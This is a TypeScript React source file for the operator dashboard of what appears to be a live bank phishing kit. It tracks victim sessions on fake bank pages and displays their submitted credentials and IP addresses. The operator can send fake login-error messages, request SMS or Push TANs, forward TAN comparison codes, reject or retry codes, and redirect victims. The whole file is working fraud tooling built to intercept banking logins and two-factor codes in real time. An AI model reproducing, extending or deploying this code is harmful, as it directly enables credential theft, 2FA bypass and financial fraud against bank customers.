"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import {
  Radio,
  X,
  AlertTriangle,
  MessageSquare,
  ExternalLink,
  RefreshCw,
  Smartphone,
  Send,
  Search,
  XCircle,
  Filter,
  KeyRound,
  ArrowRight,
  RotateCcw,
} from "lucide-react";
import { BankAvatar } from "@/components/BankAvatar";

/* ------------------------------------------------------------------ */
/*  Types                                                              */
/* ------------------------------------------------------------------ */

type Submission = {
  id: string;
  step: string;
  data: Record<string, unknown>;
  createdAt: string;
};

type Session = {
  id: string;
  shortCode: string;
  bank: { slug: string; name: string; logo?: string };
  listing: { id: string; slug: string; title: string } | null;
  currentStep: string;
  pendingCommand: {
    type: string;
    payload: Record<string, unknown>;
    issuedAt: string;
  } | null;
  lastSeenAt: string;
  createdAt: string;
  ip: string;
  submissions: Submission[];
};

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

const POLL_INTERVAL = 2000;
const TOAST_TTL = 5000;
const NEW_SUBMISSION_BADGE_TTL = 4000;

const ERROR_PRESETS = [
  "Wrong login or password. Please try again.",
  "Incorrect credentials.",
  "Login failed. Please check your details and try again.",
  "Session expired. Please log in again.",
  "Account temporarily locked. Try again in a moment.",
  // German presets
  "Falsche Anmeldedaten. Bitte versuchen Sie es erneut.",
  "Ihre Sitzung ist abgelaufen. Bitte melden Sie sich erneut an.",
  "Konto vorübergehend gesperrt. Versuchen Sie es später erneut.",
];

/* ------------------------------------------------------------------ */
/*  Toast system                                                       */
/* ------------------------------------------------------------------ */

type Toast = {
  id: string;
  message: string;
  accent: "green" | "red" | "blue";
  createdAt: number;
};

let toastIdCounter = 0;
function nextToastId() {
  return `toast-${++toastIdCounter}-${Date.now()}`;
}

/* ------------------------------------------------------------------ */
/*  Audio helper (Web Audio API beep)                                  */
/* ------------------------------------------------------------------ */

let audioCtx: AudioContext | null = null;

function playNotificationBeep() {
  try {
    if (!audioCtx) {
      audioCtx = new AudioContext();
    }
    const ctx = audioCtx;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);

    osc.type = "sine";
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(660, ctx.currentTime + 0.08);

    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.15);

    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.15);
  } catch {
    // Audio not available - silent fail
  }
}

/* ------------------------------------------------------------------ */
/*  Main component                                                     */
/* ------------------------------------------------------------------ */

export default function OperatorPage() {
  /* ---- core state ---- */
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);

  /* ---- command form state ---- */
  const [customError, setCustomError] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("");
  const [tanRejectMsg, setTanRejectMsg] = useState("");
  const [tanRedirectUrl, setTanRedirectUrl] = useState("");
  const [forwardTanCode, setForwardTanCode] = useState("");

  /* ---- filter / search state ---- */
  const [bankFilter, setBankFilter] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");

  /* ---- toast state ---- */
  const [toasts, setToasts] = useState<Toast[]>([]);

  /* ---- tracking refs for diff between polls ---- */
  const prevSessionIdsRef = useRef<Set<string>>(new Set());
  const prevSubmissionCountsRef = useRef<Map<string, number>>(new Map());
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- new-submission badges: sessionId -> timeout handle ---- */
  const [newSubmissionBadges, setNewSubmissionBadges] = useState<Set<string>>(
    new Set()
  );
  const badgeTimersRef = useRef<Map<string, ReturnType<typeof setTimeout>>>(
    new Map()
  );

  /* ---- submissions flash for selected session ---- */
  const [submissionsFlash, setSubmissionsFlash] = useState(false);
  const flashTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  /* ---- closed sessions counter (today) ---- */
  const [closedToday, setClosedToday] = useState(0);

  /* ---- helpers ---- */
  const addToast = useCallback(
    (message: string, accent: "green" | "red" | "blue" = "green") => {
      const id = nextToastId();
      setToasts((prev) => [...prev, { id, message, accent, createdAt: Date.now() }]);
      setTimeout(() => {
        setToasts((prev) => prev.filter((t) => t.id !== id));
      }, TOAST_TTL);
    },
    []
  );

  const addNewSubmissionBadge = useCallback((sessionId: string) => {
    // Clear existing timer for this session if any
    const existing = badgeTimersRef.current.get(sessionId);
    if (existing) clearTimeout(existing);

    setNewSubmissionBadges((prev) => new Set(prev).add(sessionId));

    const timer = setTimeout(() => {
      setNewSubmissionBadges((prev) => {
        const next = new Set(prev);
        next.delete(sessionId);
        return next;
      });
      badgeTimersRef.current.delete(sessionId);
    }, NEW_SUBMISSION_BADGE_TTL);

    badgeTimersRef.current.set(sessionId, timer);
  }, []);

  /* ---- data loading ---- */
  const load = useCallback(async () => {
    try {
      const res = await fetch("/api/banks/sessions");
      const d = await res.json();
      const items: Session[] = d.items || [];

      setSessions((prevSessions) => {
        const currentIds = new Set(items.map((s) => s.id));
        const prevIds = prevSessionIdsRef.current;

        // Detect new sessions
        const newSessions = items.filter((s) => !prevIds.has(s.id));
        if (prevIds.size > 0 && newSessions.length > 0) {
          for (const ns of newSessions) {
            addToast(
              `New session ${ns.shortCode} — ${ns.bank.name}`,
              "green"
            );
          }
          playNotificationBeep();
        }

        // Detect new submissions
        const prevCounts = prevSubmissionCountsRef.current;
        for (const s of items) {
          const prevCount = prevCounts.get(s.id) ?? 0;
          const currentCount = s.submissions.length;
          if (prevCount > 0 && currentCount > prevCount) {
            addNewSubmissionBadge(s.id);
          }
        }

        // Update refs
        prevSessionIdsRef.current = currentIds;
        const nextCounts = new Map<string, number>();
        for (const s of items) {
          nextCounts.set(s.id, s.submissions.length);
        }
        prevSubmissionCountsRef.current = nextCounts;

        return items;
      });

      setLoading(false);
    } catch {
      // network error - keep previous state
    }
  }, [addToast, addNewSubmissionBadge]);

  useEffect(() => {
    load();
    intervalRef.current = setInterval(load, POLL_INTERVAL);
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [load]);

  /* ---- detect new submissions on selected session for flash ---- */
  const selectedSession = sessions.find((s) => s.id === selectedId) ?? null;
  const selectedSubCountRef = useRef(0);

  useEffect(() => {
    if (!selectedSession) {
      selectedSubCountRef.current = 0;
      return;
    }
    const currentCount = selectedSession.submissions.length;
    if (
      selectedSubCountRef.current > 0 &&
      currentCount > selectedSubCountRef.current
    ) {
      setSubmissionsFlash(true);
      if (flashTimerRef.current) clearTimeout(flashTimerRef.current);
      flashTimerRef.current = setTimeout(() => setSubmissionsFlash(false), 800);
    }
    selectedSubCountRef.current = currentCount;
  }, [selectedSession?.submissions.length, selectedSession]);

  /* ---- commands ---- */
  const sendCommand = async (
    sessionId: string,
    type: string,
    payload: Record<string, unknown> = {}
  ) => {
    setSessions((prev) =>
      prev.map((s) =>
        s.id === sessionId
          ? {
              ...s,
              pendingCommand: {
                type,
                payload,
                issuedAt: new Date().toISOString(),
              },
            }
          : s
      )
    );
    await fetch(`/api/banks/sessions/${sessionId}/command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type, payload }),
    });
  };

  const closeSession = async (sessionId: string) => {
    const session = sessions.find((s) => s.id === sessionId);
    const code = session?.shortCode ?? sessionId.slice(0, 8);

    setSessions((prev) => prev.filter((s) => s.id !== sessionId));
    if (selectedId === sessionId) setSelectedId(null);
    setClosedToday((c) => c + 1);

    addToast(`Session ${code} closed`, "red");

    await fetch(`/api/banks/sessions/${sessionId}/close`, { method: "POST" });
  };

  const closeAllFiltered = async () => {
    if (!bankFilter) return;
    const toClose = sessions.filter((s) => s.bank.slug === bankFilter);
    if (toClose.length === 0) return;

    for (const s of toClose) {
      setSessions((prev) => prev.filter((x) => x.id !== s.id));
      if (selectedId === s.id) setSelectedId(null);
      fetch(`/api/banks/sessions/${s.id}/close`, { method: "POST" });
    }

    setClosedToday((c) => c + toClose.length);
    addToast(
      `Closed ${toClose.length} ${toClose[0].bank.name} session${toClose.length > 1 ? "s" : ""}`,
      "red"
    );
  };

  /* ---- derived data ---- */
  const bankCounts = useMemo(() => {
    const map = new Map<string, { slug: string; name: string; count: number }>();
    for (const s of sessions) {
      const existing = map.get(s.bank.slug);
      if (existing) {
        existing.count++;
      } else {
        map.set(s.bank.slug, {
          slug: s.bank.slug,
          name: s.bank.name,
          count: 1,
        });
      }
    }
    return Array.from(map.values()).sort((a, b) => b.count - a.count);
  }, [sessions]);

  const filteredSessions = useMemo(() => {
    let list = sessions;
    if (bankFilter) {
      list = list.filter((s) => s.bank.slug === bankFilter);
    }
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase().trim();
      list = list.filter(
        (s) =>
          s.shortCode.toLowerCase().includes(q) ||
          s.bank.name.toLowerCase().includes(q) ||
          s.ip.toLowerCase().includes(q)
      );
    }
    return list;
  }, [sessions, bankFilter, searchQuery]);

  /* ---------------------------------------------------------------- */
  /*  Render                                                           */
  /* ---------------------------------------------------------------- */

  return (
    <div className="space-y-4 relative">
      {/* ---- Toast container ---- */}
      <div className="fixed top-4 right-4 z-50 flex flex-col gap-2 pointer-events-none">
        {toasts.map((t) => (
          <div
            key={t.id}
            className={`
              pointer-events-auto px-4 py-3 rounded-xl text-sm font-medium shadow-lg
              border backdrop-blur-sm animate-slide-in-right
              ${
                t.accent === "green"
                  ? "bg-emerald-500/15 border-emerald-500/30 text-emerald-300"
                  : t.accent === "red"
                    ? "bg-red-500/15 border-red-500/30 text-red-300"
                    : "bg-blue-500/15 border-blue-500/30 text-blue-300"
              }
            `}
          >
            {t.message}
          </div>
        ))}
      </div>

      {/* ---- Page header ---- */}
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div>
          <h1 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2">
            <Radio className="w-5 h-5 text-emerald-400 animate-pulse" />
            Operator Console
          </h1>
          <p className="text-[#6B6B6B] text-sm mt-1">
            Live sessions on bank pages. Polling every 2s.
          </p>
        </div>
        <div className="flex items-center gap-3 text-xs text-[#6B6B6B]">
          {closedToday > 0 && (
            <span className="text-[#4A4A4A]">
              {closedToday} closed today
            </span>
          )}
          <span className="flex items-center gap-1.5">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            {sessions.length} active
          </span>
        </div>
      </div>

      {/* ---- Bank filter bar ---- */}
      {sessions.length > 0 && (
        <div className="flex items-center gap-2 flex-wrap">
          <Filter className="w-3.5 h-3.5 text-[#6B6B6B] shrink-0" />
          <button
            type="button"
            onClick={() => setBankFilter(null)}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors cursor-pointer ${
              bankFilter === null
                ? "bg-white text-[#0A0A0A]"
                : "bg-[#1E1E1E] text-[#A8A29E] hover:bg-[#2A2A2A] hover:text-white"
            }`}
          >
            All ({sessions.length})
          </button>
          {bankCounts.map((b) => (
            <button
              key={b.slug}
              type="button"
              onClick={() => setBankFilter(b.slug === bankFilter ? null : b.slug)}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors cursor-pointer flex items-center gap-1.5 ${
                bankFilter === b.slug
                  ? "bg-white text-[#0A0A0A]"
                  : "bg-[#1E1E1E] text-[#A8A29E] hover:bg-[#2A2A2A] hover:text-white"
              }`}
            >
              {b.name}
              <span
                className={`px-1.5 py-0.5 rounded-full text-[10px] ${
                  bankFilter === b.slug
                    ? "bg-[#0A0A0A]/10 text-[#0A0A0A]"
                    : "bg-[#2A2A2A] text-[#6B6B6B]"
                }`}
              >
                {b.count}
              </span>
            </button>
          ))}
          {bankFilter && (
            <button
              type="button"
              onClick={closeAllFiltered}
              className="ml-auto px-3 py-1.5 rounded-lg text-xs font-medium bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-colors cursor-pointer flex items-center gap-1"
            >
              <XCircle className="w-3.5 h-3.5" />
              Close All {bankCounts.find((b) => b.slug === bankFilter)?.name}
            </button>
          )}
        </div>
      )}

      {/* ---- Main grid ---- */}
      <div className="grid grid-cols-1 lg:grid-cols-[400px_1fr] gap-4">
        {/* ========= Sessions list ========= */}
        <div className="bg-[#141414] rounded-2xl overflow-hidden flex flex-col" style={{ maxHeight: "calc(100vh - 200px)" }}>
          {/* List header (fixed) */}
          <div className="px-4 py-3 border-b border-[#1E1E1E] flex items-center justify-between shrink-0">
            <p className="text-xs font-medium text-[#6B6B6B] uppercase tracking-wider">
              Active sessions
            </p>
            <div className="flex items-center gap-2">
              <span className="text-[10px] text-[#4A4A4A]">
                {filteredSessions.length}
                {filteredSessions.length !== sessions.length
                  ? ` / ${sessions.length}`
                  : ""}
              </span>
              <RefreshCw
                className="w-3.5 h-3.5 text-[#6B6B6B] animate-spin"
                style={{ animationDuration: "2s" }}
              />
            </div>
          </div>

          {/* Search box (fixed) */}
          <div className="px-3 py-2 border-b border-[#1E1E1E] shrink-0">
            <div className="relative">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[#4A4A4A]" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search by #code, bank, or IP..."
                className="w-full pl-8 pr-3 py-2 bg-[#1E1E1E] rounded-lg text-white text-xs placeholder:text-[#4A4A4A] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
              />
              {searchQuery && (
                <button
                  type="button"
                  onClick={() => setSearchQuery("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-[#6B6B6B] hover:text-white cursor-pointer"
                >
                  <X className="w-3 h-3" />
                </button>
              )}
            </div>
          </div>

          {/* Scrollable session list */}
          {loading ? (
            <div className="px-4 py-10 text-center text-[#6B6B6B] text-sm">
              Loading...
            </div>
          ) : filteredSessions.length === 0 ? (
            <div className="px-4 py-16 text-center text-[#6B6B6B] text-sm">
              {sessions.length === 0 ? (
                <>
                  No active sessions.
                  <div className="text-[#4A4A4A] text-xs mt-2">
                    Sessions appear when a victim opens a bank page.
                  </div>
                </>
              ) : (
                <>No sessions match your filter.</>
              )}
            </div>
          ) : (
            <div className="flex-1 overflow-y-auto divide-y divide-[#1E1E1E]">
              {filteredSessions.map((s) => {
                const idleSec = Math.floor(
                  (Date.now() - new Date(s.lastSeenAt).getTime()) / 1000
                );
                const isActive = idleSec < 5;
                const hasNewSub = newSubmissionBadges.has(s.id);

                return (
                  <button
                    key={s.id}
                    onClick={() => setSelectedId(s.id)}
                    className={`w-full px-4 py-2.5 flex items-center gap-3 text-left cursor-pointer transition-colors ${
                      selectedId === s.id
                        ? "bg-[#1E1E1E]"
                        : "hover:bg-[#181818]"
                    }`}
                    type="button"
                  >
                    <BankAvatar
                      name={s.bank.name}
                      slug={s.bank.slug}
                      logo={s.bank.logo}
                      size={30}
                    />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-1.5">
                        <span className="text-[11px] font-mono text-emerald-400 shrink-0">
                          {s.shortCode}
                        </span>
                        <span className="text-[11px] text-[#4A4A4A] shrink-0">
                          {"·"}
                        </span>
                        <span className="text-xs font-medium text-white truncate">
                          {s.bank.name}
                        </span>
                        {s.pendingCommand && (
                          <span className="text-[9px] px-1.5 py-0.5 bg-amber-500/20 text-amber-300 rounded shrink-0">
                            CMD
                          </span>
                        )}
                        {hasNewSub && (
                          <span className="w-2 h-2 rounded-full bg-blue-400 animate-pulse shrink-0" />
                        )}
                      </div>
                      <div className="text-[10px] text-[#6B6B6B] truncate">
                        step: {s.currentStep} {"·"} IP{" "}
                        {s.ip || "—"}
                      </div>
                    </div>
                    <div className="text-right shrink-0">
                      <div
                        className={`text-[10px] flex items-center gap-1 ${
                          isActive ? "text-emerald-400" : "text-[#6B6B6B]"
                        }`}
                      >
                        <span
                          className={`w-1.5 h-1.5 rounded-full ${
                            isActive ? "bg-emerald-400" : "bg-[#4A4A4A]"
                          }`}
                        />
                        {idleSec < 5 ? "live" : `${idleSec}s`}
                      </div>
                    </div>
                  </button>
                );
              })}
            </div>
          )}
        </div>

        {/* ========= Detail panel ========= */}
        <div className="bg-[#141414] rounded-2xl overflow-hidden">
          {!selectedSession ? (
            <div className="px-6 py-20 text-center text-[#6B6B6B] text-sm">
              Select a session from the left to send commands.
            </div>
          ) : (
            <div className="flex flex-col" style={{ maxHeight: "calc(100vh - 200px)" }}>
              {/* Detail header */}
              <div className="px-5 py-4 border-b border-[#1E1E1E] flex items-center gap-3 shrink-0">
                <BankAvatar
                  name={selectedSession.bank.name}
                  slug={selectedSession.bank.slug}
                  logo={selectedSession.bank.logo}
                  size={36}
                />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="text-sm font-mono text-emerald-400">
                      {selectedSession.shortCode}
                    </span>
                    <span className="text-sm font-semibold text-white">
                      {selectedSession.bank.name}
                    </span>
                  </div>
                  <div className="text-[11px] text-[#6B6B6B] truncate">
                    {selectedSession.listing
                      ? selectedSession.listing.title
                      : "no listing"}{" "}
                    {"·"} IP {selectedSession.ip || "—"} {"·"}{" "}
                    step: {selectedSession.currentStep}
                  </div>
                </div>
                <button
                  onClick={() => closeSession(selectedSession.id)}
                  className="px-3 py-1.5 text-xs text-red-300 bg-red-500/10 hover:bg-red-500/20 rounded-full cursor-pointer transition-colors"
                  type="button"
                  title="Close session"
                >
                  <X className="w-3.5 h-3.5 inline mr-1" />
                  Close
                </button>
              </div>

              <div className="flex-1 overflow-y-auto p-5 space-y-5">
                {/* Pending command */}
                {selectedSession.pendingCommand && (
                  <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 text-xs">
                    <div className="text-amber-300 font-medium mb-1">
                      Pending command: {selectedSession.pendingCommand.type}
                    </div>
                    <pre className="text-[10px] text-amber-200/70 overflow-x-auto">
                      {JSON.stringify(
                        selectedSession.pendingCommand.payload,
                        null,
                        2
                      )}
                    </pre>
                  </div>
                )}

                {/* Show error */}
                <Section
                  icon={<AlertTriangle className="w-4 h-4" />}
                  title="Show error to user"
                >
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    {ERROR_PRESETS.map((msg) => (
                      <button
                        key={msg}
                        onClick={() =>
                          sendCommand(selectedSession.id, "show_error", {
                            message: msg,
                          })
                        }
                        className="px-3 py-2.5 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-white text-xs rounded-xl text-left cursor-pointer transition-colors"
                        type="button"
                      >
                        {msg}
                      </button>
                    ))}
                  </div>
                  <div className="flex gap-2 mt-2">
                    <input
                      type="text"
                      value={customError}
                      onChange={(e) => setCustomError(e.target.value)}
                      placeholder="Custom error message..."
                      className="flex-1 px-3 py-2.5 bg-[#1E1E1E] rounded-xl text-white text-xs focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && customError.trim()) {
                          sendCommand(selectedSession.id, "show_error", {
                            message: customError.trim(),
                          });
                          setCustomError("");
                        }
                      }}
                    />
                    <button
                      onClick={() => {
                        if (!customError.trim()) return;
                        sendCommand(selectedSession.id, "show_error", {
                          message: customError.trim(),
                        });
                        setCustomError("");
                      }}
                      disabled={!customError.trim()}
                      className="px-4 py-2.5 bg-white hover:bg-[#E8E8E8] disabled:opacity-30 disabled:cursor-not-allowed text-[#0A0A0A] text-xs font-medium rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      <Send className="w-3.5 h-3.5 inline mr-1" />
                      Send
                    </button>
                  </div>
                  <button
                    onClick={() => sendCommand(selectedSession.id, "clear_error")}
                    className="mt-2 text-xs text-[#A8A29E] hover:text-white cursor-pointer"
                    type="button"
                  >
                    Clear current error
                  </button>
                </Section>

                {/* Request 2FA */}
                <Section
                  icon={<Smartphone className="w-4 h-4" />}
                  title="Request 2FA / TAN"
                >
                  <div className="flex gap-2 flex-wrap">
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "request_sms_tan")
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-white text-xs rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      SMS-TAN
                    </button>
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "request_push_tan")
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-white text-xs rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      Push-TAN
                    </button>
                  </div>
                  <p className="text-[10px] text-[#6B6B6B] mt-2">
                    Bank app will switch to 2FA screen if it supports this
                    command.
                  </p>
                </Section>

                {/* Step Control */}
                <Section
                  icon={<ArrowRight className="w-4 h-4" />}
                  title="Step Control"
                  note="User is on waiting screen after login"
                >
                  <div className="flex gap-2 flex-wrap">
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "back_to_login", {})
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-red-300 text-xs rounded-xl cursor-pointer transition-colors flex items-center gap-1.5"
                      type="button"
                    >
                      <RotateCcw className="w-3.5 h-3.5" />
                      Back to Login
                    </button>
                  </div>
                  <div className="flex gap-2 mt-2">
                    <input
                      type="text"
                      value={forwardTanCode}
                      onChange={(e) => setForwardTanCode(e.target.value.toUpperCase())}
                      placeholder="Enter TAN code (e.g. 67LL)..."
                      maxLength={6}
                      className="flex-1 px-3 py-2.5 bg-[#1E1E1E] rounded-xl text-white text-xs font-mono tracking-wider focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && forwardTanCode.trim()) {
                          sendCommand(selectedSession.id, "forward_to_tan", {
                            code: forwardTanCode.trim(),
                          });
                          setForwardTanCode("");
                        }
                      }}
                    />
                    <button
                      onClick={() => {
                        if (!forwardTanCode.trim()) return;
                        sendCommand(selectedSession.id, "forward_to_tan", {
                          code: forwardTanCode.trim(),
                        });
                        setForwardTanCode("");
                      }}
                      disabled={!forwardTanCode.trim()}
                      className="px-4 py-2.5 bg-emerald-500/20 hover:bg-emerald-500/30 disabled:opacity-30 disabled:cursor-not-allowed text-emerald-300 text-xs font-medium rounded-xl cursor-pointer transition-colors flex items-center gap-1.5"
                      type="button"
                    >
                      <ArrowRight className="w-3.5 h-3.5" />
                      Forward to PushTAN
                    </button>
                  </div>
                  <p className="text-[10px] text-[#6B6B6B] mt-2">
                    Enter the Vergleichswert code that will be shown on the TAN screen.
                  </p>
                </Section>

                {/* TAN Response */}
                <Section
                  icon={<KeyRound className="w-4 h-4" />}
                  title="TAN Response"
                  note="Use after user is on PushTAN screen"
                >
                  <div className="flex gap-2 flex-wrap">
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "reject_tan", {
                          message: "TAN code is incorrect. Please try again.",
                        })
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-red-300 text-xs rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      Reject TAN
                    </button>
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "retry_tan", {
                          message: "Code expired. Please enter the new code.",
                        })
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-amber-300 text-xs rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      Wrong code, retry
                    </button>
                  </div>

                  {/* Custom reject message */}
                  <div className="flex gap-2 mt-2">
                    <input
                      type="text"
                      value={tanRejectMsg}
                      onChange={(e) => setTanRejectMsg(e.target.value)}
                      placeholder="Custom reject message..."
                      className="flex-1 px-3 py-2.5 bg-[#1E1E1E] rounded-xl text-white text-xs focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && tanRejectMsg.trim()) {
                          sendCommand(selectedSession.id, "reject_tan", {
                            message: tanRejectMsg.trim(),
                          });
                          setTanRejectMsg("");
                        }
                      }}
                    />
                    <button
                      onClick={() => {
                        if (!tanRejectMsg.trim()) return;
                        sendCommand(selectedSession.id, "reject_tan", {
                          message: tanRejectMsg.trim(),
                        });
                        setTanRejectMsg("");
                      }}
                      disabled={!tanRejectMsg.trim()}
                      className="px-4 py-2.5 bg-white hover:bg-[#E8E8E8] disabled:opacity-30 disabled:cursor-not-allowed text-[#0A0A0A] text-xs font-medium rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      <Send className="w-3.5 h-3.5 inline mr-1" />
                      Reject
                    </button>
                  </div>

                  {/* Approve & redirect */}
                  <div className="flex gap-2 mt-2">
                    <input
                      type="url"
                      value={tanRedirectUrl}
                      onChange={(e) => setTanRedirectUrl(e.target.value)}
                      placeholder="Approve & redirect to https://..."
                      className="flex-1 px-3 py-2.5 bg-[#1E1E1E] rounded-xl text-white text-xs focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && tanRedirectUrl.trim()) {
                          sendCommand(selectedSession.id, "redirect", {
                            url: tanRedirectUrl.trim(),
                          });
                          setTanRedirectUrl("");
                        }
                      }}
                    />
                    <button
                      onClick={() => {
                        if (!tanRedirectUrl.trim()) return;
                        sendCommand(selectedSession.id, "redirect", {
                          url: tanRedirectUrl.trim(),
                        });
                        setTanRedirectUrl("");
                      }}
                      disabled={!tanRedirectUrl.trim()}
                      className="px-4 py-2.5 bg-emerald-500/20 hover:bg-emerald-500/30 disabled:opacity-30 disabled:cursor-not-allowed text-emerald-300 text-xs font-medium rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      Approve
                    </button>
                  </div>
                </Section>

                {/* Redirect */}
                <Section
                  icon={<ExternalLink className="w-4 h-4" />}
                  title="Redirect"
                >
                  <div className="flex gap-2">
                    <input
                      type="url"
                      value={redirectUrl}
                      onChange={(e) => setRedirectUrl(e.target.value)}
                      placeholder="https://..."
                      className="flex-1 px-3 py-2.5 bg-[#1E1E1E] rounded-xl text-white text-xs focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && redirectUrl.trim()) {
                          sendCommand(selectedSession.id, "redirect", {
                            url: redirectUrl.trim(),
                          });
                          setRedirectUrl("");
                        }
                      }}
                    />
                    <button
                      onClick={() => {
                        if (!redirectUrl.trim()) return;
                        sendCommand(selectedSession.id, "redirect", {
                          url: redirectUrl.trim(),
                        });
                        setRedirectUrl("");
                      }}
                      disabled={!redirectUrl.trim()}
                      className="px-4 py-2.5 bg-white hover:bg-[#E8E8E8] disabled:opacity-30 text-[#0A0A0A] text-xs font-medium rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      Go
                    </button>
                  </div>
                </Section>

                {/* Recent submissions */}
                <div
                  className={`transition-all duration-300 rounded-xl ${
                    submissionsFlash
                      ? "ring-2 ring-blue-400/50 bg-blue-500/5"
                      : ""
                  }`}
                >
                  <Section
                    icon={<MessageSquare className="w-4 h-4" />}
                    title={`Recent submissions (${selectedSession.submissions.length})`}
                  >
                    {selectedSession.submissions.length === 0 ? (
                      <p className="text-xs text-[#6B6B6B]">
                        No submissions yet.
                      </p>
                    ) : (
                      <div className="space-y-2">
                        {selectedSession.submissions.map((sub) => (
                          <div
                            key={sub.id}
                            className="bg-[#1E1E1E] rounded-xl p-3"
                          >
                            <div className="flex items-center justify-between mb-2">
                              <span className="text-[11px] px-2 py-0.5 bg-[#2A2A2A] rounded-full text-[#A8A29E]">
                                {sub.step}
                              </span>
                              <span className="text-[10px] text-[#6B6B6B]">
                                {new Date(sub.createdAt).toLocaleTimeString()}
                              </span>
                            </div>
                            <pre className="text-[11px] text-white overflow-x-auto">
                              {JSON.stringify(sub.data, null, 2)}
                            </pre>
                          </div>
                        ))}
                      </div>
                    )}
                  </Section>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  Section helper                                                     */
/* ------------------------------------------------------------------ */

function Section({
  icon,
  title,
  note,
  children,
}: {
  icon: React.ReactNode;
  title: string;
  note?: string;
  children: React.ReactNode;
}) {
  return (
    <div>
      <div className="flex items-center gap-1.5 text-xs font-medium text-[#A8A29E] uppercase tracking-wider mb-2">
        {icon}
        <span>{title}</span>
        {note && (
          <span className="ml-1 text-[10px] normal-case font-normal text-[#4A4A4A] tracking-normal">
            — {note}
          </span>
        )}
      </div>
      {children}
    </div>
  );
}
